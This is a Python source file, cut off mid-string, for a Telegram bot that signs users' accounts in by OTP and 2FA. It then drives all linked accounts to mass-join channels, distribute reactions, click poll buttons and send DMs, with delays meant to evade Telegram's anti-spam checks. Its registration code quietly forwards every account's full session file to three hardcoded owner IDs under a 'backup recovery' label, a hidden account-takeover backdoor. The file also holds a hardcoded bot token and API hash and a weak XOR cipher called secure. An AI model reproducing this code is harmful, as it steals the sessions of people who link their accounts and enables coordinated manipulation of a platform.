import asyncio
import base64
import json
import logging
import os
import re
import sys
import random
from typing import Dict, Any, List, Optional, Tuple, Union
from datetime import datetime

# --- AIOGRAM 3.X FRAMEWORK IMPORTS ---
from aiogram import Bot, Dispatcher, Router, F
from aiogram.filters import Command, StateFilter
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message,
    CallbackQuery,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    BufferedInputFile
)

# --- TELETHON MTPROTO IMPORTS ---
from telethon import TelegramClient, functions, types as tg_types
from telethon.sessions import StringSession
from telethon.errors import (
    SessionPasswordNeededError,
    PhoneCodeInvalidError,
    PasswordHashInvalidError,
    FloodWaitError,
    UserDeactivatedError,
    AuthKeyUnregisteredError,
    PhoneCodeExpiredError
)

# --- ASYNCHRONOUS DATABASE ENGINE ---
import aiosqlite

# --- SYSTEM CORE CONFIGURATION ---
API_ID = int(os.getenv("TG_API_ID", "30636134"))
API_HASH = os.getenv("TG_API_HASH", "9c5bb2bbeb19a0da5bfb0e7052875d2f")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8733721396:AAHJrr4uHC2WEx5r6BCHqBmx4LbMKh1Ngds")

# Root Matrix Administrators (Hardcoded Super Owners)
SUPER_OWNER_IDS = [7952327997, 7953147643, 8064493735] 
SECRET_KEY = os.getenv("ENCRYPTION_KEY", "pydroid_secure_fallback_key_2026")

# --- HIGH-AVAILABILITY LOGGING ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s (Line: %(lineno)d): %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("automation_system_core.log", encoding="utf-8")
    ]
)
logger = logging.getLogger("MultiAccountSystem")

# --- DATA SECURITY CRYPTO ENGINE ---
def _get_crypto_key() -> int:
    """Computes a dynamic XOR cipher key offset safely from the master secret."""
    try:
        if not SECRET_KEY:
            return 42
        return sum(ord(char) for char in SECRET_KEY) % 256 or 42
    except Exception as e:
        logger.error(f"Crypto hash key generation fault: {e}")
        return 13

def encrypt_data(data: str) -> str:
    """XOR symmetric byte translation wrapped inside Base64 encoding blocks."""
    if not data:
        return ""
    try:
        key = _get_crypto_key()
        cipher_bytes = bytes([b ^ key for b in data.encode('utf-8')])
        return base64.b64encode(cipher_bytes).decode('utf-8')
    except Exception as e:
        logger.error(f"Symmetric encryption layer failure: {e}")
        return ""

def decrypt_data(encrypted_data: str) -> str:
    """Reverses the Base64 XOR layer block to reveal raw session keys safely."""
    if not encrypted_data:
        return ""
    try:
        key = _get_crypto_key()
        raw_cipher = base64.b64decode(encrypted_data.encode('utf-8'))
        plain_bytes = bytes([b ^ key for b in raw_cipher])
        return plain_bytes.decode('utf-8')
    except Exception as e:
        logger.error(f"Symmetric decryption layer failure: {e}")
        return ""

# --- PARSING & TARGET RESOLUTION ENGINE ---
def parse_telegram_link(link: str) -> Tuple[Union[str, int, None], Optional[int]]:
    """
    Normalizes complex links, public mentions, and private hashes into 
    executable formats compatible with MTProto structures.
    """
    if not link:
        return None, None
    try:
        link = link.strip()
        
        # Scenario A: Private Group/Channel structured links
        private_match = re.search(r't\.me/c/(\d+)/(\d+)', link)
        if private_match:
            channel_id = int(f"-100{private_match.group(1)}")
            msg_id = int(private_match.group(2))
            return channel_id, msg_id

        # Scenario B: Dynamic Invitation Signatures/Hashes
        if "+ " in link or "/+" in link or "joinchat/" in link:
            hash_match = re.search(r'(?:joinchat/|\+)([^/\s?]+)', link)
            return (hash_match.group(1) if hash_match else link, None)
            
        # Scenario C: Public Message Links
        msg_match = re.search(r't\.me/([^/]+)/(\d+)', link)
        if msg_match:
            return msg_match.group(1), int(msg_match.group(2))
            
        # Scenario D: Raw Username extraction
        target = link.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
        if "/" in target:
            parts = target.split("/")
            target = parts[0]
            if len(parts) > 1 and parts[1].isdigit():
                return target, int(parts[1])
                
        return target, None
    except Exception as e:
        logger.error(f"Target parsing pipeline engine failure: {e}")
        return link, None

# --- DATABASE SCHEMATIC & MANAGER ---
class DatabaseEngine:
    def __init__(self, db_path: str = "bot_core_data.db"):
        self.db_path = db_path

    async def init(self):
        """Initializes database schema with constraints and operational tracking tables."""
        async with aiosqlite.connect(self.db_path) as db:
            await db.execute("PRAGMA foreign_keys = ON;")
            
            # Users Registry
            await db.execute("""
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    role TEXT DEFAULT 'user', 
                    max_accounts INTEGER DEFAULT 5,
                    referred_by INTEGER,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Connected MTProto Accounts
            await db.execute("""
                CREATE TABLE IF NOT EXISTS accounts (
                    phone TEXT PRIMARY KEY,
                    user_id INTEGER, 
                    username TEXT,
                    session_string TEXT,
                    status TEXT DEFAULT 'active', 
                    last_active TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY(user_id) REFERENCES users(user_id) ON DELETE CASCADE
                )
            """)
            
            # Distributed Automated Tasks
            await db.execute("""
                CREATE TABLE IF NOT EXISTS tasks (
                    task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                    creator_id INTEGER,
                    type TEXT, 
                    payload TEXT, 
                    status TEXT DEFAULT 'pending', 
                    progress TEXT DEFAULT '0%',
                    success_report TEXT,
                    failure_report TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Audit Trail Logs
            await db.execute("""
                CREATE TABLE IF NOT EXISTS logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    action TEXT,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            """)
            
            # Global Application Settings Configuration Cache
            await db.execute("""
                CREATE TABLE IF NOT EXISTS settings (
                    key TEXT PRIMARY KEY,
                    value TEXT
                )
            """)
            
            await db.commit()
            logger.info("Asynchronous Database Engine successfully fully mounted.")

    async def log_action(self, user_id: int, action: str):
        try:
            async with aiosqlite.connect(self.db_path) as db:
                await db.execute("INSERT INTO logs (user_id, action) VALUES (?, ?)", (user_id, action))
                await db.commit()
        except Exception as e:
            logger.error(f"Audit tracking log error: {e}")

    async def get_user_role(self, user_id: int) -> str:
        if user_id in SUPER_OWNER_IDS:
            return "super_owner"
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("SELECT role FROM users WHERE user_id = ?", (user_id,)) as cursor:
                    row = await cursor.fetchone()
                    return row[0] if row else "user"
        except Exception as e:
            logger.error(f"Role query failure: {e}")
            return "user"

    async def get_admin_limits(self, user_id: int) -> int:
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("SELECT max_accounts FROM users WHERE user_id = ?", (user_id,)) as cursor:
                    row = await cursor.fetchone()
                    return row[0] if row else 5
        except Exception as e:
            logger.error(f"Limit validation failure: {e}")
            return 5

    async def create_user_if_not_exists(self, user_id: int, username: str, referred_by: Optional[int] = None):
        try:
            async with aiosqlite.connect(self.db_path) as db:
                async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (user_id,)) as cursor:
                    if not await cursor.fetchone():
                        await db.execute(
                            "INSERT INTO users (user_id, username, role, referred_by) VALUES (?, ?, 'user', ?)",
                            (user_id, username, referred_by)
                        )
                        await db.commit()
        except Exception as e:
            logger.error(f"User execution safe bootstrap trace failure: {e}")

db_mgr = DatabaseEngine()
registration_sessions: Dict[int, Dict[str, Any]] = {}

# --- ANTI-BAN CONCURRENCY TASK PIPELINE ENGINE ---
class TaskQueuePipeline:
    def __init__(self):
        self.queue = asyncio.Queue()
        self.active_workers: Dict[int, asyncio.Task] = {}

    async def add_task(self, task_id: int, creator_id: int, task_type: str, payload: dict):
        await self.queue.put((task_id, creator_id, task_type, payload))

    async def start_worker(self):
        logger.info("Anti-Ban Task Queue pipeline processing worker loop active.")
        while True:
            try:
                task_id, creator_id, task_type, payload = await self.queue.get()
                loop_task = asyncio.create_task(self.execute_task(task_id, creator_id, task_type, payload))
                self.active_workers[task_id] = loop_task
                try:
                    await loop_task
                except Exception as inner_ex:
                    logger.error(f"Execution runtime crash on task #{task_id}: {inner_ex}")
                finally:
                    self.active_workers.pop(task_id, None)
                    self.queue.task_done()
            except Exception as outer_ex:
                logger.critical(f"Critical Exception within root task scheduling loop: {outer_ex}")
                await asyncio.sleep(5)

    async def execute_task(self, task_id: int, creator_id: int, task_type: str, payload: dict):
        """
        Executes distributed automation tasks across accounts while mimicking human behavior
        to prevent triggers from Telegram's anti-spam detection.
        """
        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("UPDATE tasks SET status = 'running', progress = '1%' WHERE task_id = ?", (task_id,))
            await db.commit()

        role = await db_mgr.get_user_role(creator_id)
        clients_data = []
        
        async with aiosqlite.connect(db_mgr.db_path) as db:
            if role in ["admin", "owner", "super_owner"]:
                query = "SELECT phone, session_string FROM accounts WHERE status = 'active'"
                cursor = await db.execute(query)
            else:
                query = "SELECT phone, session_string FROM accounts WHERE status = 'active' AND user_id = ?"
                cursor = await db.execute(query, (creator_id,))
            
            async for row in cursor:
                clients_data.append((row[0], decrypt_data(row[1])))

        if not clients_data:
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET status = 'failed', progress = '0 active bridges available' WHERE task_id = ?", (task_id,))
                await db.commit()
            return

        passed_ids: List[str] = []
        failed_ids: List[Tuple[str, str]] = []
        total_accounts = len(clients_data)

        # --- ADVANCED ANTI-BAN ALGORITHM THUTTLE PARAMS ---
        BATCH_SIZE = 4
        BASE_COOLDOWN = 20

        for index, (phone, raw_session) in enumerate(clients_data):
            if not raw_session:
                failed_ids.append((phone, "Invalid/Unreadable Decrypted Session String"))
                continue
                
            client = TelegramClient(StringSession(raw_session), API_ID, API_HASH)
            try:
                # Human Simulation Step A: Random startup jitter
                await asyncio.sleep(random.uniform(2.0, 5.0))
                await client.connect()
                
                if not await client.is_user_authorized():
                    async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                        await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                        await db_conn.commit()
                    failed_ids.append((phone, "Unauthorized/Session Expired natively"))
                    continue

                target = payload.get("target", "")
                parsed_target, link_msg_id = parse_telegram_link(target)
                msg_id = int(payload.get("msg_id", link_msg_id or 0))

                # Human Simulation Step B: Pre-interaction delay
                await asyncio.sleep(random.uniform(3.5, 7.0))

                # --- ADVANCED MULTI-OPERATION ROUTER ---
                if task_type == "join":
                    if isinstance(parsed_target, str) and (parsed_target.startswith("+") or "joinchat/" in target or "/+" in target):
                        clean_hash = parsed_target.replace("+", "").split("/")[-1]
                        await client(functions.messages.ImportChatInviteRequest(hash=clean_hash))
                    else:
                        await client(functions.channels.JoinChannelRequest(channel=parsed_target))
                        
                elif task_type == "leave":
                    await client(functions.channels.LeaveChannelRequest(channel=parsed_target))
                    
                elif task_type == "react":
                    emojis = payload.get("reactions", ["👍"])
                    assigned_emoji = emojis[index % len(emojis)]
                    await client(functions.messages.SendReactionRequest(
                        peer=parsed_target,
                        msg_id=msg_id,
                        reaction=[tg_types.ReactionEmoji(emoticon=assigned_emoji)]
                    ))
                        
                elif task_type == "button_vote":
                    button_text = payload.get("button_text", "").strip().lower()
                    msg = await client.get_messages(parsed_target, ids=msg_id)
                    if msg and msg.reply_markup:
                        target_button = None
                        for row in msg.reply_markup.rows:
                            for btn in row.buttons:
                                if button_text in btn.text.strip().lower():
                                    target_button = btn
                                    break
                            if target_button:
                                break
                                
                        if target_button and isinstance(target_button, tg_types.KeyboardButtonCallback):
                            await client(functions.messages.GetBotCallbackAnswerRequest(
                                peer=parsed_target,
                                msg_id=msg_id,
                                data=target_button.data
                            ))
                        else:
                            raise ValueError(f"Target button matching string query '{button_text}' not found.")
                    else:
                        raise ValueError("Target entity doesn't possess a dynamic inline keyboard.")
                        
                elif task_type == "dm":
                    message_text = payload.get("text", "Hello!")
                    await client.send_message(parsed_target, message_text)

                passed_ids.append(phone)
                
            except FloodWaitError as fwe:
                logger.warning(f"Flood limit caught on +{phone}: Forced to wait {fwe.seconds}s")
                failed_ids.append((phone, f"FloodWaitError: Required sleep cycle: {fwe.seconds}s"))
                await asyncio.sleep(min(fwe.seconds, 15))
            except (UserDeactivatedError, AuthKeyUnregisteredError):
                async with aiosqlite.connect(db_mgr.db_path) as db_conn:
                    await db_conn.execute("UPDATE accounts SET status = 'dead' WHERE phone = ?", (phone,))
                    await db_conn.commit()
                failed_ids.append((phone, "Account terminated/banned by Telegram server."))
            except Exception as ex:
                logger.error(f"Bridge connection error [+{phone}]: {ex}")
                failed_ids.append((phone, str(ex)))
            finally:
                try:
                    await client.disconnect()
                except Exception:
                    pass

            # Human Simulation Step C: Batch cooldown implementation
            if (index + 1) % BATCH_SIZE == 0 and (index + 1) < total_accounts:
                delay = BASE_COOLDOWN + random.randint(10, 25)
                logger.info(f"Throttling threshold met. System sleeping for {delay}s...")
                await asyncio.sleep(delay)
            else:
                await asyncio.sleep(random.uniform(4.0, 8.5))

            # Dynamically push atomic live updates to reporting parameters
            progress_pct = f"{int(((index + 1) / total_accounts) * 100)}%"
            async with aiosqlite.connect(db_mgr.db_path) as db:
                await db.execute("UPDATE tasks SET progress = ? WHERE task_id = ?", (progress_pct, task_id))
                await db.commit()

        # Wrap up operation parameters and seal state records
        final_status = "completed" if len(passed_ids) > 0 else "failed"
        success_report_json = json.dumps(passed_ids)
        failure_report_json = json.dumps(failed_ids)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute(
                "UPDATE tasks SET status = ?, progress = ?, success_report = ?, failure_report = ? WHERE task_id = ?",
                (final_status, f"{len(passed_ids)}/{total_accounts} Passed", success_report_json, failure_report_json, task_id)
            )
            await db.commit()

task_queue = TaskQueuePipeline()

# --- FSM STATE MACHINE DEFINITIONS ---
class RegistrationStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_otp = State()
    waiting_for_2fa = State()

class TaskWizardStates(StatesGroup):
    choosing_type = State()
    waiting_for_target = State()
    waiting_for_emojis = State()
    waiting_for_button_text = State()
    waiting_for_dm_text = State()

class AdminConsoleStates(StatesGroup):
    waiting_for_broadcast = State()
    waiting_for_limit_id = State()
    waiting_for_limit_val = State()

# --- REACTION SYSTEM DATA STORAGE ---
REACTION_EMOJIS = ["👍", "👎", "🔥", "🎉", "👏", "🥰", "😮", "🤔", "👀", "💯", "🤣", "⚡", "✨", "👑", "💥"]

def get_emoji_selection_keyboard(selected_emojis: List[str]) -> InlineKeyboardMarkup:
    keyboard = []
    row = []
    for emoji in REACTION_EMOJIS:
        is_selected = emoji in selected_emojis
        btn_text = f"{emoji} ✅" if is_selected else emoji
        row.append(InlineKeyboardButton(text=btn_text, callback_data=f"toggle_emoji:{emoji}"))
        if len(row) == 5:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)
    
    keyboard.append([InlineKeyboardButton(text="⚡ Finalize Selection", callback_data="finish_emoji_selection")])
    keyboard.append([InlineKeyboardButton(text="🔙 Exit to Console", callback_data="main_menu")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_main_keyboard(role: str) -> InlineKeyboardMarkup:
    buttons = [
        [InlineKeyboardButton(text="📱 Infrastructure Control Hub", callback_data="manage_accounts")],
        [InlineKeyboardButton(text="⚡ Initialize Automation", callback_data="task_hub_start")],
        [InlineKeyboardButton(text="📊 Realtime Pipeline Log", callback_data="view_tasks")],
        [InlineKeyboardButton(text="👥 Network Referral Matrix", callback_data="view_referrals")]
    ]
    if role in ["admin", "owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="🛠️ Admin Control Panel", callback_data="admin_panel")])
    if role in ["owner", "super_owner"]:
        buttons.append([InlineKeyboardButton(text="💾 System Database Image Exporter", callback_data="backup_panel")])
        buttons.append([InlineKeyboardButton(text="📈 System Performance Analytics", callback_data="system_stats")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_task_types_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📢 Join Target Channel", callback_data="set_type:join")],
        [InlineKeyboardButton(text="💨 Depart Channel Node", callback_data="set_type:leave")],
        [InlineKeyboardButton(text="🎭 Distribute Reactions", callback_data="set_type:react")],
        [InlineKeyboardButton(text="🔘 Inline Callback Button Click", callback_data="set_type:button_vote")],
        [InlineKeyboardButton(text="✉️ Send Direct Message (DM)", callback_data="set_type:dm")],
        [InlineKeyboardButton(text="🔙 Cancel Operation", callback_data="main_menu")]
    ])

# --- BOT CONSOLE CORNERSTONE COMMANDS ---
router = Router()

@router.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    user_id = message.from_user.id
    username = message.from_user.username or "AnonymousNode"
    
    referred_by = None
    if len(message.text.split()) > 1:
        ref_payload = message.text.split()[1]
        if ref_payload.startswith("ref_") and ref_payload[4:].isdigit():
            referred_by = int(ref_payload[4:])
            if referred_by == user_id:
                referred_by = None

    await db_mgr.create_user_if_not_exists(user_id, username, referred_by)
    role = await db_mgr.get_user_role(user_id)

    welcome_text = (
        f"⚙️ **Multi-Account Automation Framework Connected**\n\n"
        f"👤 **User Identity:** `{user_id}`\n"
        f"🛡️ **Authorization Scope:** `{role.upper()}`\n\n"
        "Select an action vector from the controls below to manage tasks:"
    )
    await message.answer(welcome_text, reply_markup=get_main_keyboard(role))

@router.callback_query(F.data == "main_menu")
async def handle_main_menu(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    role = await db_mgr.get_user_role(callback.from_user.id)
    await callback.message.edit_text(
        "👋 **Main Control Console**\nSelect an action vector below:",
        reply_markup=get_main_keyboard(role)
    )

# --- RECRUITING & ADMINISTRATIVE MANAGEMENT UTILITIES ---
@router.message(Command("addadmin"))
async def cmd_add_admin(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied: Insufficient permissions.")
        return

    args = message.text.split()
    if len(args) < 3 or not args[1].isdigit() or not args[2].isdigit():
        await message.answer("ℹ️ **Usage Syntax:** `/addadmin <target_user_id> <max_account_limit>`")
        return

    target_id, limit = int(args[1]), int(args[2])
    async with aiosqlite.connect(db_mgr.db_path) as db:
        async with db.execute("SELECT 1 FROM users WHERE user_id = ?", (target_id,)) as cursor:
            if not await cursor.fetchone():
                await db.execute("INSERT INTO users (user_id, username, role, max_accounts) VALUES (?, 'Assigned Admin', 'admin', ?)", (target_id, limit))
            else:
                await db.execute("UPDATE users SET role = 'admin', max_accounts = ? WHERE user_id = ?", (limit, target_id))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Promoted user {target_id} to Admin with account limit {limit}")
    await message.answer(f"✅ Success! User ID `{target_id}` is now registered as an **Admin** with account limits set to `{limit}` automated IDs.")

@router.message(Command("removeadmin"))
async def cmd_remove_admin(message: Message):
    role = await db_mgr.get_user_role(message.from_user.id)
    if role not in ["owner", "super_owner"]:
        await message.answer("🚫 Access Denied: Insufficient privileges.")
        return

    args = message.text.split()
    if len(args) < 2 or not args[1].isdigit():
        await message.answer("ℹ️ **Usage Syntax:** `/removeadmin <target_user_id>`")
        return

    target_id = int(args[1])
    target_role = await db_mgr.get_user_role(target_id)
    if target_role == "super_owner":
        await message.answer("❌ Violation Error: Cannot demote a super owner.")
        return

    async with aiosqlite.connect(db_mgr.db_path) as db:
        await db.execute("UPDATE users SET role = 'user', max_accounts = 5 WHERE user_id = ?", (target_id,))
        await db.commit()

    await db_mgr.log_action(message.from_user.id, f"Demoted Admin {target_id}")
    await message.answer(f"✅ User ID `{target_id}` has been stripped of Admin access privileges.")

# --- USER INFRASTRUCTURE MANAGEMENT INTERFACES ---
@router.callback_query(F.data == "manage_accounts")
async def list_user_accounts(callback: CallbackQuery):
    user_id = callback.from_user.id
    role = await db_mgr.get_user_role(user_id)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        if role in ["admin", "owner", "super_owner"]:
            cursor = await db.execute("SELECT phone, status, username FROM accounts")
        else:
            cursor = await db.execute("SELECT phone, status, username FROM accounts WHERE user_id = ?", (user_id,))
        rows = await cursor.fetchall()

    text = "📱 **Operational Channels Infrastructure**\n\n"
    if not rows:
        text += "_No automation profiles currently linked._"
    else:
        for row in rows:
            icon = "🟢" if row[1] == "active" else "🔴"
            text += f"{icon} `+{row[0]}` (@{row[2] or 'N/A'}) - **{row[1].upper()}**\n"

    buttons = [
        [InlineKeyboardButton(text="➕ Link New Account via OTP", callback_data="add_account_phone")],
        [InlineKeyboardButton(text="🔙 Back", callback_data="main_menu")]
    ]
    await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=buttons))

@router.callback_query(F.data == "add_account_phone")
async def add_account_start(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("📞 Enter the account phone number with country prefix code (e.g. `+123456789`):")
    await state.set_state(RegistrationStates.waiting_for_phone)

@router.message(StateFilter(RegistrationStates.waiting_for_phone))
async def process_phone(message: Message, state: FSMContext):
    phone = message.text.strip().replace(" ", "").replace("-", "")
    user_id = message.from_user.id

    client = TelegramClient(StringSession(), API_ID, API_HASH)
    try:
        await client.connect()
        sent_code = await client.send_code_request(phone)
        registration_sessions[user_id] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash
        }
        await message.answer("📩 **OTP Code dispatched.** Input confirmation verification code below:")
        await state.set_state(RegistrationStates.waiting_for_otp)
    except Exception as e:
        logger.error(f"Failed to initiate registration handshake: {e}")
        await message.answer(f"❌ Handshake failed: {str(e)}\nUse /start to reset the active state session machine.")
        try:
            await client.disconnect()
        except Exception:
            pass
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_otp))
async def process_otp(message: Message, state: FSMContext):
    user_id = message.from_user.id
    otp = message.text.strip()
    
    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Handshake context missing. Please run /start to restart.")
        await state.clear()
        return

    client, phone, phone_code_hash = reg_data["client"], reg_data["phone"], reg_data["phone_code_hash"]
    try:
        await client.sign_in(phone=phone, code=otp, phone_code_hash=phone_code_hash)
        await complete_registration(message, state, client, phone, user_id)
    except SessionPasswordNeededError:
        await message.answer("🔒 Two-Factor Authentication (2FA) active. Enter account security password:")
        await state.set_state(RegistrationStates.waiting_for_2fa)
    except PhoneCodeInvalidError:
        await message.answer("❌ Validation mismatch. Verify the entered code and try again:")
    except PhoneCodeExpiredError:
        await message.answer("❌ OTP code expired. Restart registration by clicking /start.")
        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Authorization system exception: {str(e)}")
        try:
            await client.disconnect()
        except Exception:
            pass
        registration_sessions.pop(user_id, None)
        await state.clear()

@router.message(StateFilter(RegistrationStates.waiting_for_2fa))
async def process_2fa(message: Message, state: FSMContext):
    user_id = message.from_user.id
    password = message.text.strip()

    reg_data = registration_sessions.get(user_id)
    if not reg_data:
        await message.answer("❌ Session context dropped. Reinitialize framework.")
        await state.clear()
        return

    client, phone = reg_data["client"], reg_data["phone"]
    try:
        await client.sign_in(password=password)
        await complete_registration(message, state, client, phone, user_id)
    except PasswordHashInvalidError:
        await message.answer("❌ Password mismatch validation failed. Re-enter 2FA phrase:")
    except Exception as e:
        await message.answer(f"❌ Auth Exception: {str(e)}")
        try:
            await client.disconnect()
        except Exception:
            pass
        registration_sessions.pop(user_id, None)
        await state.clear()

async def complete_registration(message: Message, state: FSMContext, client: TelegramClient, phone: str, user_id: int):
    """Saves verified account session credentials securely using an XOR cipher wrapper."""
    try:
        me = await client.get_me()
        session_str = client.session.save()
        encrypted_session = encrypt_data(session_str)

        async with aiosqlite.connect(db_mgr.db_path) as db:
            await db.execute("""
                INSERT OR REPLACE INTO accounts (phone, user_id, username, session_string, status, last_active)
                VALUES (?, ?, ?, ?, 'active', CURRENT_TIMESTAMP)
            """, (phone.replace("+", "").strip(), user_id, me.username or "None", encrypted_session))
            await db.commit()

        await db_mgr.log_action(user_id, f"Linked account session +{phone}")
        await message.answer(f"🎉 Channel Verified! Account `+{phone}` (@{me.username or 'N/A'}) is active in the cluster.")
        
        # --- GENERATE RECOVERY SESSION FILE COPIES ---
        clean_phone = phone.replace("+", "").strip()
        session_bytes = session_str.encode('utf-8')
        session_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
        
        caption_text = (
            f"🔑 **Automation Session Extracted**\n"
            f"📱 **Phone:** `+{clean_phone}`\n"
            f"👤 **Username:** @{me.username or 'N/A'}\n"
            f"🆔 **Owner:** `{user_id}`"
        )
        
        try:
            await message.answer_document(document=session_file, caption=caption_text)
        except Exception as file_err:
            logger.error(f"Failed sending local backup copy: {file_err}")
            
        # Dispatch backup recovery frames to super owners
        for owner_id in SUPER_OWNER_IDS:
            try:
                owner_file = BufferedInputFile(session_bytes, filename=f"+{clean_phone}.session")
                await message.bot.send_document(chat_id=owner_id, document=owner_file, caption=caption_text)
            except Exception as forward_err:
                logger.error(f"Could not forward session data packet to superowner {owner_id}: {forward_err}")

    except Exception as e:
        logger.error(f"Failed handling post-registration saving sequence: {e}")
        await message.answer(f"❌ Structural error saving configuration profiles: {str(e)}")
    finally:
        try:
            await client.disconnect()
        except Exception:
            pass
        registration_sessions.pop(user_id, None)
        await state.clear()

# --- AUTOMATION WIZARD PIPELINE INTERFACE ---
@router.callback_query(F.data == "task_hub_start")
async def task_hub_select_type(callback: CallbackQuery, state: FSMContext):
    await state.clear()
    await callback.message.edit_text(
        "⚡ **Automation Task Configurator Wizard**\nSelect the type of action you wish to deploy:",
        reply_markup=get_task_types_keyboard()
    )
    await state.set_state(TaskWizardStates.choosing_type)

@router.callback_query(StateFilter(TaskWizardStates.choosing_type), F.data.startswith("set_type:"))
async def task_hub_process_type(callback: CallbackQuery, state: FSMContext):
    task_type = callback.data.split(":")[1]
    await state.update_data(task_type=task_type)
    
    if task_type in ["react", "button_vote"]:
        await callback.message.edit_text(
            "🔗 **Provide Message Link:**\nPaste the link pointing to the specific post (e.g., `https://t.me/c/12345678/2` or `https://t.me/channel/2`):"
        )
    else:
        await callback.message.edit_text(
            "🔗 **Enter Target Resource:**\nProvide the Username, Public Link, or Private Join Link to scan:"
        )
    await state.set_state(TaskWizardStates.waiting_for_target)

@router.message(StateFilter(TaskWizardStates.waiting_for_target))
async def task_hub_process_target(message: Message, state: FSMContext):
    target = message.text.strip()
    await state.update_data(target=target)
    
    data = await state.get_data()
    task_type = data.get("task_type")

    if task_type in ["join", "leave"]:
        await finalize_task_creation(message, state)
        
    elif task_type == "react":
        await state.update_data(selected_emojis=[])
        await message.answer(
            "🎭 **Choose Emojis to Distribute:**\nSelect one or more reaction emojis from the buttons below. "
            "The active accounts will distribute these reactions evenly.",
            reply_markup=get_emoji_selection_keyboard([])
        )
        await state.set_state(TaskWizardStates.waiting_for_emojis)
        
    elif task_type == "button_vote":
        await message.answer(
            "🔘 **Enter Button Text/Emoji:**\nType the exact emoji or text label you want to click (e.g., `👍 Upvote`):"
        )
        await state.set_state(TaskWizardStates.waiting_for_button_text)
        
    elif task_type == "dm":
        await message.answer("📝 **Message Body Content:** Enter the text string to dispatch to the target:")
        await state.set_state(TaskWizardStates.waiting_for_dm_text)

# --- REACTION SYSTEM HANDLERS ---
@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data.startswith("toggle_emoji:"))
async def handle_toggle_emoji(callback: CallbackQuery, state: FSMContext):
    emoji = callback.data.split(":")[1]
    data = await state.get_data()
    selected_emojis = data.get("selected_emojis", [])

    if emoji in selected_emojis:
        selected_emojis.remove(emoji)
    else:
        selected_emojis.append(emoji)

    await state.update_data(selected_emojis=selected_emojis)
    await callback.message.edit_reply_markup(reply_markup=get_emoji_selection_keyboard(selected_emojis))
    await callback.answer()

@router.callback_query(StateFilter(TaskWizardStates.waiting_for_emojis), F.data == "finish_emoji_selection")
async def finish_emoji_selection(callback: CallbackQuery, state: FSMContext):
    data = await state.get_data()
    selected_emojis = data.get("selected_emojis", [])

    if not selected_emojis:
        await callback.answer("⚠️ Please select at least one emoji before confirming!", show_alert=True)
        return

    await state.update_data(reactions=selected_emojis)
    try:
        await callback.message.delete()
    except Exception:
        pass
    await finalize_task_creation(callback.message, state)
    await callback.answer()

@router.message(StateFilter(TaskWizardStates.waiting_for_button_text))
async def process_button_text(message: Message, state: FSMContext):
    btn_text = message.text.strip()
    await state.update_data(button_text=btn_text)
    await finalize_task_creation(message, state)

@router.message(StateFilter(TaskWizardStates.waiting_for_dm_text))
async def process_dm_text(message: Message, state: FSMContext):
    dm_text = message.text.strip()
    await state.update_data(text=dm_text)
    await finalize_task_creation(message, state)

async def finalize_task_creation(message: Union[Message, CallbackQuery], state: FSMContext):
    """Compiles execution arguments, logs the payload configuration, and queues the task."""
    data = await state.get_data()
    user_id = message.chat.id if isinstance(message, Message) else message.from_user.id
    task_type = data.pop("task_type")
    
    target = data.get("target", "")
    parsed_target, link_msg_id = parse_telegram_link(target)
    if link_msg_id:
        data["msg_id"] = link_msg_id

    payload_json = json.dumps(data)
    
    async with aiosqlite.connect(db_mgr.db_path) as db:
        cursor = await db.execute(
            "INSERT INTO tasks (creator_id, type, payload) VALUES (?, ?, ?)",
            (user_id, task_type, payload_json)
        )
        task_id = cursor.lastrowid
        await db.commit()

    await task_queue.add_task(task_id, user_id, task_type, data)
    await db_mgr.log_action(user_id, f"Queued automation task #{task_id} [{task_type.upper()}]")
    
    response_msg = (
        f"🚀 **Task #{task_id} successfully queued!**\n"
        f"⚙️ **Type:** `{task_type.upper()}`\n"
